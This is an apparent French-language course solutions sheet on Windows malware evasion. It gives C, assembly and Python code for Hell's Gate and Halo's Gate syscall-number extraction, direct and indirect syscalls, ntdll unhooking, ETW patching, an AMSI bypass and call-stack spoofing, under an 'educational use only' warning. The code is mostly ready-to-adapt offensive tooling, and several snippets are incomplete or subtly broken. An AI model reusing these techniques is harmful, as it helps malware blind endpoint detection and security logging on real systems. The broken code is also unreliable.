⚠️ AVERTISSEMENT STRICT
Techniques de malware development avancées. Usage éducatif uniquement.
Tests sur VM isolées. Usage malveillant = PRISON.

SOLUTIONS - MODULE 22 : DIRECT SYSCALLS

===============================================================================
SOLUTION 1 : HELL'S GATE COMPLET
===============================================================================

Extraction de SSN pour multiples fonctions NTAPI :

#include <windows.h>
#include <stdio.h>

typedef struct {
    const char* name;
    DWORD ssn;
    BOOL hooked;
} SSN_Entry;

// Extraire SSN depuis stub ntdll
DWORD extract_ssn(BYTE* func_addr) {
    // Pattern normal : 4C 8B D1 B8 [SSN] 00 00 00
    if (func_addr[0] == 0x4C && func_addr[1] == 0x8B &&
        func_addr[2] == 0xD1 && func_addr[3] == 0xB8) {
        return *(DWORD*)(func_addr + 4);
    }
    return 0;
}

// Scanner toutes les fonctions
void scan_all_ntapi() {
    const char* funcs[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtQueueApcThread",
        "NtOpenProcess",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtGetContextThread",
        "NtSetContextThread"
    };

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    for (int i = 0; i < 10; i++) {
        BYTE* addr = (BYTE*)GetProcAddress(ntdll, funcs[i]);
        DWORD ssn = extract_ssn(addr);
        printf("%s : SSN = 0x%X\n", funcs[i], ssn);
    }
}

APIs clés :
- GetModuleHandleA : Obtenir handle ntdll.dll
- GetProcAddress : Résoudre adresse fonction
- Opcode parsing : 4C 8B D1 B8 pour identifier stub

Référence :
- Hell's Gate paper (VX-Underground)
- Windows syscall internals

===============================================================================
SOLUTION 2 : HALO'S GATE AVEC DÉTECTION HOOKS
===============================================================================

Détection de hooks et calcul SSN par voisins :

BOOL is_hooked(BYTE* addr) {
    // Hook détection
    if (addr[0] == 0xE9) return TRUE;  // JMP rel32
    if (addr[0] == 0xEB) return TRUE;  // JMP short
    if (addr[0] == 0xFF && addr[1] == 0x25) return TRUE;  // JMP [rip+off]

    // Check normal pattern
    if (addr[0] == 0x4C && addr[1] == 0x8B &&
        addr[2] == 0xD1 && addr[3] == 0xB8) {
        return FALSE;
    }

    return TRUE;  // Inconnu = hookée
}

DWORD halo_gate_search(BYTE* hooked_func) {
    // Chercher vers le bas
    for (int i = 1; i < 100; i++) {
        BYTE* neighbor = hooked_func + (i * 0x20);

        if (!IsBadReadPtr(neighbor, 32) && !is_hooked(neighbor)) {
            DWORD neighbor_ssn = extract_ssn(neighbor);
            if (neighbor_ssn) {
                return neighbor_ssn - i;  // SSN déduit
            }
        }
    }

    // Chercher vers le haut
    for (int i = 1; i < 100; i++) {
        BYTE* neighbor = hooked_func - (i * 0x20);

        if (!IsBadReadPtr(neighbor, 32) && !is_hooked(neighbor)) {
            DWORD neighbor_ssn = extract_ssn(neighbor);
            if (neighbor_ssn) {
                return neighbor_ssn + i;
            }
        }
    }

    return 0;
}

// Usage
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
BYTE* func = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

if (is_hooked(func)) {
    DWORD ssn = halo_gate_search(func);
    printf("[Halo's Gate] Deduced SSN: 0x%X\n", ssn);
}

Techniques :
- Neighbor scanning (±100 fonctions)
- SSN calculation by offset
- Hook pattern detection

Référence :
- Halo's Gate paper
- EDR hook analysis

===============================================================================
SOLUTION 3 : SYSCALL WRAPPER GÉNÉRIQUE
===============================================================================

Wrapper universel pour syscalls directs (x64) :

// Macro pour définir syscall
#define SYSCALL_STUB(name, num_args) \
    __attribute__((naked)) NTSTATUS Syscall_##name() { \
        asm volatile( \
            "mov r10, rcx\n" \
            "mov eax, [g_ssn_"#name"]\n" \
            "syscall\n" \
            "ret\n" \
        ); \
    }

// Variables globales pour SSN
DWORD g_ssn_NtAllocateVirtualMemory = 0;
DWORD g_ssn_NtProtectVirtualMemory = 0;

// Générer stubs
SYSCALL_STUB(NtAllocateVirtualMemory, 6)
SYSCALL_STUB(NtProtectVirtualMemory, 5)

// Initialisation
void init_syscalls() {
    g_ssn_NtAllocateVirtualMemory = hell_gate("NtAllocateVirtualMemory");
    g_ssn_NtProtectVirtualMemory = hell_gate("NtProtectVirtualMemory");
}

// Usage
PVOID base = NULL;
SIZE_T size = 0x1000;
NTSTATUS status = Syscall_NtAllocateVirtualMemory(
    (HANDLE)-1, &base, 0, &size, MEM_COMMIT, PAGE_READWRITE);

Alternative avec inline ASM complet :

NTSTATUS syscall_invoke(DWORD ssn, PVOID arg1, PVOID arg2,
                       PVOID arg3, PVOID arg4, PVOID arg5) {
    NTSTATUS status;

    asm volatile(
        "mov r10, rcx\n"      // Sauver 1er arg
        "mov eax, %1\n"       // SSN
        "mov rcx, %2\n"       // arg1
        "mov rdx, %3\n"       // arg2
        "mov r8, %4\n"        // arg3
        "mov r9, %5\n"        // arg4
        "syscall\n"
        "mov %0, eax\n"
        : "=r"(status)
        : "r"(ssn), "r"(arg1), "r"(arg2), "r"(arg3), "r"(arg4)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11"
    );

    return status;
}

Référence :
- x64 calling convention (MSDN)
- SysWhispers2 project

===============================================================================
SOLUTION 4 : FRESH NTDLL MAPPING
===============================================================================

Charger copie propre de ntdll.dll depuis disk :

PVOID map_fresh_ntdll() {
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);

    if (!hMapping) return NULL;

    PVOID mapped = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);

    return mapped;
}

// Extraire SSN depuis fresh copy
DWORD get_ssn_from_fresh(const char* func_name) {
    PVOID fresh_ntdll = map_fresh_ntdll();
    if (!fresh_ntdll) return 0;

    // Parser PE
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fresh_ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)fresh_ntdll + dos->e_lfanew);

    DWORD export_rva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)fresh_ntdll + export_rva);

    DWORD* names = (DWORD*)((BYTE*)fresh_ntdll + exports->AddressOfNames);
    DWORD* functions = (DWORD*)((BYTE*)fresh_ntdll + exports->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)fresh_ntdll + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)fresh_ntdll + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE* func = (BYTE*)fresh_ntdll + functions[ordinals[i]];
            DWORD ssn = extract_ssn(func);

            UnmapViewOfFile(fresh_ntdll);
            return ssn;
        }
    }

    UnmapViewOfFile(fresh_ntdll);
    return 0;
}

Détection de hooks par comparaison :

void detect_all_hooks() {
    PVOID fresh = map_fresh_ntdll();
    HMODULE loaded = GetModuleHandleA("ntdll.dll");

    // Comparer .text section
    PIMAGE_NT_HEADERS nt_fresh = ...;
    PIMAGE_SECTION_HEADER text_sect = ...;

    BYTE* fresh_text = (BYTE*)fresh + text_sect->VirtualAddress;
    BYTE* loaded_text = (BYTE*)loaded + text_sect->VirtualAddress;

    for (DWORD i = 0; i < text_sect->SizeOfRawData; i++) {
        if (fresh_text[i] != loaded_text[i]) {
            printf("[!] Hook detected at offset 0x%X\n", i);
        }
    }
}

Référence :
- PE format documentation
- Perun's Fart unhooking technique

===============================================================================
SOLUTION 5 : ETW PATCHING VIA SYSCALL
===============================================================================

Désactiver ETW en patchant EtwEventWrite :

BOOL patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* etw_func = (BYTE*)GetProcAddress(ntdll, "EtwEventWrite");

    if (!etw_func) return FALSE;

    // Patch : remplacer par 'ret' (0xC3)
    BYTE patch[] = { 0xC3 };  // ret

    // Obtenir SSN pour NtProtectVirtualMemory
    DWORD ssn = hell_gate("NtProtectVirtualMemory");

    // Changer protection en RWX via syscall
    PVOID addr = etw_func;
    SIZE_T size = sizeof(patch);
    DWORD old_protect;

    // Syscall direct pour NtProtectVirtualMemory
    asm volatile(
        "mov r10, rcx\n"
        "mov eax, %0\n"
        "syscall\n"
        :: "r"(ssn)
    );

    // Écrire patch
    memcpy(etw_func, patch, sizeof(patch));

    // Restaurer protection
    // NtProtectVirtualMemory again...

    printf("[+] ETW patched successfully\n");
    return TRUE;
}

// Bonus : AMSI bypass
BOOL patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    BYTE* scan_buffer = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");

    // Patch pour retourner AMSI_RESULT_CLEAN
    BYTE patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG)
        0xC3                            // ret
    };

    // Même technique que ETW
    // NtProtectVirtualMemory + memcpy + restore

    return TRUE;
}

Référence :
- ETW internals (MSDN)
- AMSI bypass techniques (Red Team notes)

===============================================================================
SOLUTION 6 : NTDLL UNHOOKING COMPLET
===============================================================================

Restaurer ntdll.dll hookée par EDR :

BOOL unhook_ntdll() {
    PVOID fresh = map_fresh_ntdll();
    HMODULE hooked = GetModuleHandleA("ntdll.dll");

    // Obtenir .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fresh;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)fresh + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

    PIMAGE_SECTION_HEADER text_sect = NULL;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            text_sect = &sections[i];
            break;
        }
    }

    if (!text_sect) return FALSE;

    // SSN pour NtProtectVirtualMemory et NtWriteVirtualMemory
    DWORD ssn_protect = get_ssn_from_fresh("NtProtectVirtualMemory");
    DWORD ssn_write = get_ssn_from_fresh("NtWriteVirtualMemory");

    // Adresses
    PVOID hooked_text = (BYTE*)hooked + text_sect->VirtualAddress;
    PVOID fresh_text = (BYTE*)fresh + text_sect->VirtualAddress;
    SIZE_T text_size = text_sect->Misc.VirtualSize;

    // Changer protection RWX
    DWORD old_protect;
    syscall_invoke(ssn_protect, (HANDLE)-1, &hooked_text,
                   &text_size, PAGE_EXECUTE_READWRITE, &old_protect);

    // Restaurer bytes originaux
    syscall_invoke(ssn_write, (HANDLE)-1, hooked_text,
                   fresh_text, text_size, NULL);

    // Restaurer protection originale
    syscall_invoke(ssn_protect, (HANDLE)-1, &hooked_text,
                   &text_size, old_protect, &old_protect);

    // Flush instruction cache
    DWORD ssn_flush = get_ssn_from_fresh("NtFlushInstructionCache");
    syscall_invoke(ssn_flush, (HANDLE)-1, NULL, 0);

    UnmapViewOfFile(fresh);
    printf("[+] ntdll.dll unhooked successfully\n");

    return TRUE;
}

Référence :
- EDR unhooking (Red Team tactics)
- ntdll restoration techniques

===============================================================================
SOLUTION 7 : INDIRECT SYSCALLS
===============================================================================

Éviter détection en jumpant vers stub ntdll au lieu de syscall direct :

// Trouver adresse 'syscall' instruction dans ntdll
PVOID find_syscall_gadget() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    // Pattern : syscall (0F 05) dans le stub
    for (int i = 0; i < 100; i++) {
        if (func[i] == 0x0F && func[i+1] == 0x05) {
            return &func[i];
        }
    }

    return NULL;
}

// Indirect syscall via jump
NTSTATUS indirect_syscall(DWORD ssn, ...) {
    static PVOID syscall_gadget = NULL;

    if (!syscall_gadget) {
        syscall_gadget = find_syscall_gadget();
    }

    // Setup SSN
    asm volatile("mov eax, %0" :: "r"(ssn));

    // Jump vers gadget ntdll au lieu de syscall direct
    asm volatile("jmp *%0" :: "r"(syscall_gadget));

    // Return address sera dans ntdll = légitime !
}

// Call stack spoofing avancé
void spoof_return_address() {
    // Modifier stack frame pour simuler appel depuis ntdll
    PVOID fake_ret = (BYTE*)GetModuleHandleA("ntdll.dll") + 0x1000;

    asm volatile(
        "push %0\n"
        "ret\n"
        :: "r"(fake_ret)
    );
}

Référence :
- Indirect syscalls (MDSec)
- Call stack spoofing techniques

===============================================================================
SOLUTION 8 : SYSCALL SYSWHISPERS CLONE
===============================================================================

Script Python pour générer syscall stubs automatiquement :

import pefile
import struct

def extract_all_ssn(ntdll_path):
    pe = pefile.PE(ntdll_path)
    exports = {}

    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name and exp.name.startswith(b'Nt'):
            rva = exp.address
            func_bytes = pe.get_data(rva, 16)

            # Pattern : 4C 8B D1 B8 [SSN] 00 00
            if func_bytes[0:4] == b'\x4C\x8B\xD1\xB8':
                ssn = struct.unpack('<I', func_bytes[4:8])[0]
                exports[exp.name.decode()] = ssn

    return exports

def generate_header(exports):
    header = "#ifndef SYSCALLS_H\n#define SYSCALLS_H\n\n"

    for name, ssn in exports.items():
        header += f"#define SSN_{name} 0x{ssn:X}\n"

    header += "\n#endif\n"
    return header

def generate_asm_stubs(exports):
    asm = ".code\n\n"

    for name in exports.keys():
        asm += f"{name} PROC\n"
        asm += f"    mov r10, rcx\n"
        asm += f"    mov eax, SSN_{name}\n"
        asm += f"    syscall\n"
        asm += f"    ret\n"
        asm += f"{name} ENDP\n\n"

    asm += "END\n"
    return asm

# Usage
exports = extract_all_ssn("C:\\Windows\\System32\\ntdll.dll")

with open("syscalls.h", "w") as f:
    f.write(generate_header(exports))

with open("syscalls.asm", "w") as f:
    f.write(generate_asm_stubs(exports))

print(f"[+] Generated stubs for {len(exports)} functions")

Compilation :
ml64 /c syscalls.asm
cl main.c syscalls.obj

Référence :
- SysWhispers2 (GitHub)
- Syscall number database (j00ru)
- Windows version detection for SSN mapping
